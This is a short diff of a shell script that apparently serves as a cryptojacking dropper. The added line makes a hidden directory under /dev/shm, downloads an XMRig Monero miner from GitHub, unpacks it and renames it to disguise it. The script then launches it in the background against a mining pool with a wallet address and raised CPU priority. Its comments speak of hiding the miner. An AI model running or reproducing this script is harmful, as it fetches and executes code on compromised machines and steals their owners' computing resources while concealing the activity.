@@ -1,5 +1,5 @@
 # Hide in sensible location
-wget -O /dev/shm/.f/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf /dev/shm/.f/xmrig.tar.gz && rm -f /dev/shm/.f/xmrig.tar.gz && mv /dev/shm/.f/xmrig /dev/shm/.f/mo
+mkdir /dev/shm/.f && wget -O /dev/shm/.f/xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf /dev/shm/.f/xmrig.tar.gz && rm -f /dev/shm/.f/xmrig.tar.gz && mv /dev/shm/.f/xmrig /dev/shm/.f/mo
 # straight launch
 /dev/shm/.f/mo --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass Nextjs_333! --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 --cpu-max-threads-hint 50
 
